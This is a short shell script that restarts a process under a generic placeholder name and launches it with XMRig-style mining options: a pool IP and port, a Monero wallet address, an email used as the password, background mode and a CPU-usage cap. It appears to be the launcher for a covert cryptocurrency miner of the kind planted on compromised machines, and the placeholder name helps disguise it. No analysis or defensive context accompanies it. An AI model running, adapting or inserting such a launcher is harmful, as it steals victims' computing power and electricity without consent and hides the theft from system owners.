pkill defaultsoftwarename
sleep 7
defaultsoftwarename -o 37.1.215.13:23281 -u 45RXCkJUNXyhzU9sf239zvArQ68v26xbnSr23RxHWddd7huRpEy936RZUc2iEsk5YtXG4K3NcwV8ehrQaJqcCfm3UgQv3zq --pass=x:tonymathews932@yahoo.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1 --variant -1
